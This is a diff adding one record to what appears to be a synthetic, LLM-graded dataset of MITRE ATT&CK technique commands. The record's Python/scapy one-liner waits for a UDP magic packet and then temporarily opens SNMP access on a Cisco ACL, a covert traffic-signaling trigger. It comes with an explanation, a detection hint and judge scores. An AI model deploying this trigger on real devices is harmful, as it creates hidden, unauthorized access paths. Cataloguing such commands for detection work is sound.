@@ -1,0 +1,48 @@
+{
+  "technique_id": "T1205",
+  "platform": "Network Devices",
+  "shell": "Bash",
+  "command": "sudo python3 -c 'from scapy.all import sniff,IP,UDP,Raw; import os; p=sniff(filter=\"udp dst port 62201\", lfilter=lambda x: x.haslayer(Raw) and b\"MAGIC:SNMP-OPEN\" in bytes(x[Raw].load), count=1)[0]; os.system(f\"ciscoconf --apply \\\"ip access-list extended MGMT-SNMP; permit udp host {p[IP].src} any eq 161\\\" && (sleep 300; ciscoconf --apply \\\"ip access-list extended MGMT-SNMP; no permit udp host {p[IP].src} any eq 161\\\") &\")'",
+  "explanation": "Waits for a UDP magic packet on 62201 containing MAGIC:SNMP-OPEN, then allows SNMP (UDP/161) from the sender for 5 minutes via ciscoconf. Requires sudo for sniffing.",
+  "rationale_steps": [
+    "Use scapy to sniff a specific magic string in UDP payloads (traffic signaling).",
+    "Add a temporary ACL entry to permit UDP/161 from the source IP and schedule automatic removal.",
+    "No authentication manipulation; only port gating is changed.",
+    "Detection: monitor unusual UDP traffic to 62201 and audit transient SNMP ACL changes."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-BASH-T1205-7a393370-c6a4c29c",
+  "source_prompt_hash": "7a393370",
+  "timestamp_utc": "2025-09-30T06:01:37.763989Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "Balanced quotes and parentheses with valid Python and shell syntax, proper escaping inside the f-string, and correctly chained commands.",
+        "semantic_score": 4,
+        "semantic_justification": "It plausibly implements traffic signaling by sniffing for a magic UDP packet and triggering a timed SNMP ACL change, though it depends on the existence of 'ciscoconf' and specific device ACL semantics.",
+        "combined_score": 4.5,
+        "confidence": 0.86,
+        "timestamp": "2025-10-01T15:08:11.360403Z"
+      },
+      {
+        "model": "gemini-2.0-flash-thinking-exp",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with balanced quotes, correct Python and shell syntax, and proper use of f-strings for embedding variables.",
+        "semantic_score": 5,
+        "semantic_justification": "The command perfectly implements the Traffic Signaling technique by using a specific UDP payload on a non-standard port to trigger temporary network access for SNMP, utilizing appropriate tools and logic.",
+        "combined_score": 5.0,
+        "confidence": 1,
+        "timestamp": "2025-10-01T15:08:31.833543Z"
+      }
+    ],
+    "llm_average_syntactic": 5.0,
+    "llm_average_semantic": 4.5,
+    "llm_average_score": 4.75,
+    "llm_verdict": "likely_match",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
